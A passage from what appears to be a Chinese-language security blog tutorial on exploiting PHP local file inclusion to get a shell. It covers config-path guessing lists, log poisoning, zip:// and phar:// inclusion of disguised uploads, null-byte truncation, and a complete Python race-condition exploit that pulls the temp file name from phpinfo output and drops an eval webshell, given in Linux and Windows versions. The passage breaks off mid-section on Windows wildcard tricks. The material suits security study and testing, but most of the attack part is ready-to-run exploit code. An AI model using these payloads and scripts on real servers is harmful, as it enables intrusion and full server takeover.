Files\StormII\Storm.exe网站相对路径:/config.php../../config.php../config.php../../../config.php/config.inc.php./config.inc.php../../config.inc.php../config.inc.php../../../config.inc.php/conn.php./conn.php../../conn.php../conn.php../../../conn.php/conn.asp./conn.asp../../conn.asp../conn.asp../../../conn.asp/config.inc.php./config.inc.php../../config.inc.php../config.inc.php../../../config.inc.php/config/config.php../../config/config.php../config/config.php../../../config/config.php/config/config.inc.php./config/config.inc.php../../config/config.inc.php../config/config.inc.php../../../config/config.inc.php/config/conn.php./config/conn.php../../config/conn.php../config/conn.php../../../config/conn.php/config/conn.asp./config/conn.asp../../config/conn.asp../config/conn.asp../../../config/conn.asp/config/config.inc.php./config/config.inc.php../../config/config.inc.php../config/config.inc.php../../../config/config.inc.php/data/config.php../../data/config.php../data/config.php../../../data/config.php/data/config.inc.php./data/config.inc.php../../data/config.inc.php../data/config.inc.php../../../data/config.inc.php/data/conn.php./data/conn.php../../data/conn.php../data/conn.php../../../data/conn.php/data/conn.asp./data/conn.asp../../data/conn.asp../data/conn.asp../../../data/conn.asp/data/config.inc.php./data/config.inc.php../../data/config.inc.php../data/config.inc.php../../../data/config.inc.php/include/config.php../../include/config.php../include/config.php../../../include/config.php/include/config.inc.php./include/config.inc.php../../include/config.inc.php../include/config.inc.php../../../include/config.inc.php/include/conn.php./include/conn.php../../include/conn.php../include/conn.php../../../include/conn.php/include/conn.asp./include/conn.asp../../include/conn.asp../include/conn.asp../../../include/conn.asp/include/config.inc.php./include/config.inc.php../../include/config.inc.php../include/config.inc.php../../../include/config.inc.php/inc/config.php../../inc/config.php../inc/config.php../../../inc/config.php/inc/config.inc.php./inc/config.inc.php../../inc/config.inc.php../inc/config.inc.php../../../inc/config.inc.php/inc/conn.php./inc/conn.php../../inc/conn.php../inc/conn.php../../../inc/conn.php/inc/conn.asp./inc/conn.asp../../inc/conn.asp../inc/conn.asp../../../inc/conn.asp/inc/config.inc.php./inc/config.inc.php../../inc/config.inc.php../inc/config.inc.php../../../inc/config.inc.php/index.php./index.php../../index.php../index.php../../../index.php/index.asp./index.asp../../index.asp../index.asp../../../index.asp</code></pre><p><strong>1.包含日志文件</strong></p><p>通过burp访问:</p><pre><code class="shell">1.http://127.0.0.1:8081/test.php?file=&lt;?php phpinfo();?&gt;2.http://127.0.0.1:8081/test.php?file=../../../../../../../var/log/apache2/access.log</code></pre><p><strong>2.包含系统环境</strong></p><p>linux(FreeBSD是没有这个的)下的/proc/self/environ 会获取用户的UA</p><pre><code class="shell">VM-221-25-ubuntu:/var/log# ls -al /proc/self/environ-r-------- 1 root root 0 Jun 30 09:51 /proc/self/environ</code></pre><p>这个其实有点意思,应该实战可能会出现的情景,个人认为应该是httpd或者php的权限太高导致的。</p><p>Exploiting LFI to RCE /proc/self/environ with burpsuite:<a href="https://www.youtube.com/watch?v=dlh0ogYy9ys">https://www.youtube.com/watch?v=dlh0ogYy9ys</a></p><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>这个实战性还是很强的,所以这里我进行演示下,在默认phpstudy安装环境下如何实现getshell</p><p>默认安装的时候是没有开启日志记录功能的也就是不存在 <code>access.log</code></p><p>但是默认存在php error log</p><p><code>C:\phpStudy\Apache\logs\error.log</code>是存在的</p><p>不能在浏览器上直接访问,因为浏览器会自动urlencode编码特殊字符,所以利用的时候要用burp去操作</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125193307776.png" alt="image-20221125193307776"></p><p><strong>1.访问不存在带有payload的文件</strong></p><p>(我这里访问403后apache没有记录日志，晕)</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195055671.png" alt="image-20221125195055671"></p><p>然后查看下</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195753881.png" alt="image-20221125195753881"></p><p>发现成功写入</p><pre><code class="php">http://127.0.0.1/index.php?file=C:\phpStudy\Apache\logs\error.log   //然后直接getshell</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195838342.png" alt="image-20221125195838342"></p><h3 id="存在上传图片等功能结合文件包含getshell"><a href="#存在上传图片等功能结合文件包含getshell" class="headerlink" title="存在上传图片等功能结合文件包含getshell"></a>存在上传图片等功能结合文件包含getshell</h3><p><strong>情况1 任意文件包含</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$file = $_GET[&#39;file&#39;];include($file);?&gt;</code></pre><p>还是这种情况(任意文件可控包含),这个时候如果可以上传文件比如图片之类的,直接包含起来就行了。</p><p>比如我们上传一个HY.png</p><p>内容:</p><pre><code class="php">&lt;?php phpinfo();?&gt;</code></pre><p>我们包含这个图片:</p><pre><code class="php">http://193.43.142.8/sakura.php?file=HY.png</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125212231293.png" alt="image-20221125212231293"></p><p><strong>情况2 限制后缀</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$file = $_GET[&#39;file&#39;].&quot;.php&quot;; //限制只能包含php后缀的文件。include($file);?&gt;</code></pre><p>因为上传点只允许上传<code>.jpg .png .gif</code>后缀的图片,比如我们上传了 <code>HY.jpg</code></p><p>内容还是和上面一样，我们尝试包含一下</p><p>此时就无法包含成功了</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125212513234.png" alt="image-20221125212513234"></p><p>因为拼接之后就是: <code>HY.jpg.php</code>这个文件肯定不存在</p><p>这个时候我们就可以利用伪协议来进行绕过。</p><p>我们构造一个zip压缩包:</p><p>就是写一个shell.php -&gt; zip压缩得到压缩包,然后改名为shell.png,去上传</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125213118153.png" alt="image-20221125213118153"></p><p>然后修改后缀为shell.png,我们假设我们把这个图片上传到了服务器，我们来用一些协议去包含它</p><ol><li>利用**<code>zip://</code>协议**</li></ol><blockquote><p>zip://与phar://的使用类似，但是需要绝对路径， zip文件后面要跟%23加zip文件里的文件</p></blockquote><p>windows可用</p><p>可构造出路径:</p><pre><code class="php">http://127.0.0.1/index.php?file=zip://E:/phpstudy_pro/WWW/shell.png%23shell</code></pre><p>我用linux尝试了但是没有包含成功</p><p>2.利用**<code>phar://</code>协议**</p><p>windows和Linux都可用</p><p>这个也可以用前面的那个压缩包,不过不需要#去分开压缩包里面的内容了,<code>phar://</code>协议是根据文件头去判断是不是压缩文件的,所以shell.png不会影响正常解析出这个压缩包。(这个在CTF比赛中很常见)</p><pre><code class="php">http://127.0.0.1/index.php?file=phar://shell.png/shell</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125214942739.png" alt="image-20221125214942739"></p><p>这个协议我在linux上也测试成功了，猜测是绝对路径出了问题</p><pre><code class="php">http://193.43.142.8/sakura.php?file=phar://shell.png/shell</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215039282.png" alt="image-20221125215039282"></p><p><strong>3.利用截断绕过(老版本PHP)</strong></p><p>这个以前还是很常见的,现在的话,利用很有限,这里就不去搭建环境测试了。<br> 引用l3mon师傅博客的写的总结。</p><blockquote><ol><li>%00截断<br> /etc/passwd%00<br> (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li><li>%00截断目录遍历：<br> /var/www/%00<br> (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li><li>路径长度截断：<br> /etc/passwd/././././././.[…]/./././././.<br> (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li><li>点号截断：<br> /boot.ini/………[…]…………<br> (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li></ol></blockquote><p>现在很少见版本这么低的了，就不复现辣</p><h3 id="phpinfo-LFI-本地文件包含临时文件getshell"><a href="#phpinfo-LFI-本地文件包含临时文件getshell" class="headerlink" title="phpinfo-LFI 本地文件包含临时文件getshell"></a>phpinfo-LFI 本地文件包含临时文件getshell</h3><p>phpinfo(); 可以给我们提供什么信息?</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215626807.png" alt="image-20221125215626807"></p><p>开头的内容能给我门提供很多信息(我画的红框里面)</p><p>常用:</p><blockquote><p>system info  详细的操作系统信息 确定window  or linux<br> Registered PHP Streams and filters  注册的php过滤器和流协议<br> extension_dir php扩展的路径<br> short_open_tag     &lt;?= 和 &lt;? echo 等价<br> disable_function 禁用函数<br> open_basedir 将用户可操作的文件限制在某目录下<br> SERVER_ADDR  真实ip<br> DOCUMENT_ROOT web根目录<br> _FILES[“file”] 可以获取临时文件名字和路径<br> session 可以查看session的相关配置</p></blockquote><p>原理非常简单:</p><p>我们构造一个上传表单的时候,php也会生成一个对应的临时文件,这个文件的相关内容可以在phpinfo()的<code>_FILE[&quot;file&quot;]</code>查看到,但是临时文件很快就会被删除,所以我们赶在临时文件被删除之前,包含临时文件就可以getshell了。</p><p>php处理流程timeline如下:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215748773.png" alt="image-20221125215748773"></p><p><strong>1.我们来了解一下PHP临时文件的机制:</strong></p><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。</p><p>$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p><pre><code class="php">$_FILES[&#39;userfile&#39;][&#39;name&#39;] 客户端文件的原名称。$_FILES[&#39;userfile&#39;][&#39;type&#39;] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如&quot;image/gif&quot;。$_FILES[&#39;userfile&#39;][&#39;size&#39;] 已上传文件的大小，单位为字节。$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。$_FILES[&#39;userfile&#39;][&#39;error&#39;] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。</code></pre><p>在临时文件包含漏洞中<code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p><p><strong>2.存储目录</strong></p><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的<code>upload_tmp_dir</code>属性指定，假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p><p>不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。</p><pre><code class="shell">Linux目录Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。/tmp/Windows目录Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。C:/Windows/C:/Windows/Temp/</code></pre><p><strong>3.命名规则</strong></p><p>服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</p><p>可以通过phpinfo来查看临时文件的信息。</p><p><strong>存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</strong></p><p>可以通过phpinfo来查看临时文件的信息。</p><p><strong>(1)Linux Temporary File</strong></p><p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162746868.png" alt="image-20221126162746868"></p><p><strong>(2)Windows Temporary File</strong></p><p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162905801.png" alt="image-20221126162905801"></p><p>PHPINFO特性</p><p><strong>通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</strong></p><p>虽说这个漏洞出现的很早(2011年，国外的安全研究人员将这种攻击手法进行卡了公布)，不过这个技巧确实是个很经典的列子，不会被遗忘的。</p><p><strong>4.漏洞分析</strong></p><p>当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。<strong>文件名可以在<code>$_FILES</code>变量中找到</strong>。这个临时文件，在请求结束后就会被删除。</p><p><strong>利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量（所有数据）都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，拿到 临时文件变量名 之后，就可以进行包含执行我们传入的恶意代码。</strong></p><p><strong>5.漏洞利用</strong></p><p><strong>利用条件</strong>:几乎通杀</p><p><strong>测试脚本</strong></p><p>编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。</p><pre><code class="php">import requestsfiles = &#123;  &#39;file&#39;: (&quot;aa.txt&quot;,&quot;ssss&quot;)&#125;url = &quot;http://x.x.x.x/phpinfo.php&quot;r = requests.post(url=url, files=files, allow_redirects=False)print(r.text)</code></pre><p>运行脚本向服务器发出请求可以看到回显中有如下内容</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162746868.png" alt="image-20221126162746868"></p><p>windows同理</p><p><strong>利用原理</strong>:</p><p><strong>验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。</strong></p><p><strong>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。</strong>但是在第一个请求结束，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p><strong>利用过程</strong>:</p><p>这个时候就需要用到条件竞争，具体原理和过程如下：</p><p>（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p><p>（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p><p>（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p><p>（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p><p>（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p><p>（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p><p><strong>Getshell脚本</strong>:</p><p>利用p牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如<strong>上传的恶意文件内容</strong>、<strong>phpinfo.php</strong>和<strong>index.php</strong>相应文件的文件名和位置、<strong>系统临时文件写入目录</strong>等</p><p><strong>Linux测试</strong></p><p>exp.py</p><pre><code class="python">#!/usr/bin/python# coding:utf-8import sysimport threadingimport socketdef setup(host, port):    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\r&lt;?php $c=fopen(&#39;/tmp/HY666.php&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php eval($_REQUEST[HY]);?&gt;&#39;);?&gt;\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD    padding=&quot;A&quot; * 5000    # 这里需要修改为phpinfo.php的地址    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script    LFIREQ=&quot;&quot;&quot;GET /sakura.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)        fn = d[i+17:i+31]        print fn    except ValueError:        return None    s2.send(lfireq % (fn, host))    print lfireq % (fn, host) #debug调试结果    d = s2.recv(4096)    print d #查看回显是否成功    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                if x:                    print &quot;\nGot it! Shell created in /tmp/g&quot;                    self.event.set()            except socket.error:                returndef getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)    d = &quot;&quot;    while True:        i = s.recv(4096)        d+=i        if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\r\n\r\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)    print &quot;found %s at %i&quot; % (d[i:i+10],i)    # padded up a bit    return i+256def main():    print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)    poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,    reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\nTelling threads to shutdown...&quot;        e.set()    print &quot;Shuttin&#39; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()</code></pre><p>可以用inotifywait命令来监控对tmp文件和目录的访问记录</p><pre><code class="shell">apt install inotify-toolsinotifywait -mrq -e &#39;create,delete,close_write,attrib,moved_to&#39; --timefmt &#39;%Y-%m-%d %H:%M&#39; --format &#39;%T %w%f %e&#39; /tmp/</code></pre><p>然后修改脚本内容后运行:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127012226499.png" alt="image-20221127012226499"></p><p>但是我这里运行后并没有生成文件，郁闷，看监控，每次tmp文件也正常生成的</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127012329797.png" alt="image-20221127012329797"></p><p>查看脚本debug，也是正常的</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127023204975.png" alt="image-20221127023204975"></p><p>很奇怪，我自己尝试了下，发现/tmp/目录下的文件无法包含成功??(这里对111.php写入了phpinfo函数)</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127023414471.png" alt="image-20221127023414471"></p><p>可能是我之前搞得一些东西，对目录做了限制，不过大体思路知道就没问题辣!</p><p><strong>windows</strong></p><p>同理，修改脚本文件生成路径即可</p><pre><code class="php">#!/usr/bin/python# coding:utf-8import sysimport threadingimport socketdef setup(host, port):    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\r&lt;?php $c=fopen(&#39;C:\Windows\Temp\dd.php&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php eval($_REQUEST[HY]);?&gt;&#39;);?&gt;\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD    padding=&quot;A&quot; * 5000    # 这里需要修改为phpinfo.php的地址    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script    LFIREQ=&quot;&quot;&quot;GET /index.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)        fn = d[i+17:i+39]        print fn    except ValueError:        return None    s2.send(lfireq % (fn, host))    # print lfireq % (fn, host) #debug调试结果    d = s2.recv(4096)    # print d #查看回显是否成功    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                if x:                    print &quot;\nGot it! Shell created in /tmp/g&quot;                    self.event.set()            except socket.error:                returndef getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)    d = &quot;&quot;    while True:        i = s.recv(4096)        d+=i        if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\r\n\r\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)    print &quot;found %s at %i&quot; % (d[i:i+10],i)    # padded up a bit    return i+256def main():    print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)    poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,    reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\nTelling threads to shutdown...&quot;        e.set()    print &quot;Shuttin&#39; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()</code></pre><p><strong>记得，一定要修改切片位置，不然哭死</strong></p><pre><code class="shell">python2 exp.py 127.0.0.1 80 200</code></pre><p>然后成功在目录找到了这个文件</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127022812771.png" alt="image-20221127022812771"></p><h3 id="Windows-通配符妙用"><a href="#Windows-通配符妙用" class="headerlink" title="Windows 通配符妙用"></a>Windows 通配符妙用</h3><p><code>phpinfo-LFI 本地文件包含临时文件getshell</code>中的利用方法需要两个条件：</p><ol><li>存在phpinfo等可以泄露临时文件名的页面</li><li>网络条件好，才能让Race Condition成功</li></ol><p>特别是第一个，现在很少有机会让我们在实战中找到phpinfo页面。但是如果目标操作系统是Windows，我们可以借助一些特殊的Tricks来实现文件包含的利用。</p><p>PHP在读取Windows文件时，会使用到<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfileexw">FindFirstFileExW</a>这个Win32 API来查找文件，而这个API是支持使用通配符的：</p><blockquote><p><strong>lpFileName</strong></p><p>The directory or path, and the file name. The file name can include  wildcard characters, for example, an asterisk (*) or a question mark  (?).</p></blockquote><p>实际测试下来，PHP中星号和问号并不能直接作为通配符使用。</p><p>但我们在<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-_fsrtl_advanced_fcb_header-fsrtlisnameinexpression">MSDN官方文档</a>中还可以看到这样的说明：</p><blockquote><p>The following wildcard characters can be used in the pattern string.</p><p>Wildcard character  Meaning</p><p>***** (asterisk)               Matches zero or more characters.</p><p><strong>?</strong> (question mark)   Matches a single character.</p><p><strong>DOS_DOT</strong>                 Matches either a period or zero characters beyond the name string.</p><p><strong>DOS_QM</strong>                  Matches any single character or, upon encountering a period or end of name string, advances the  expression to the end of the set of contiguous DOS_QMs.</p><p><strong>DOS_STAR</strong>               Matches zero or more characters until encountering and matching the final . in the name.</p></blockquote><p>其中除了星号和问号外，还提到了三个特殊符号DOS_DOT、DOS_QM、DOS_STAR，虽然官方并没有在文档中给出他们对应的值具体是什么，但在ntifs.h头文件中还是能找到他们的定义：</p><pre><code>// 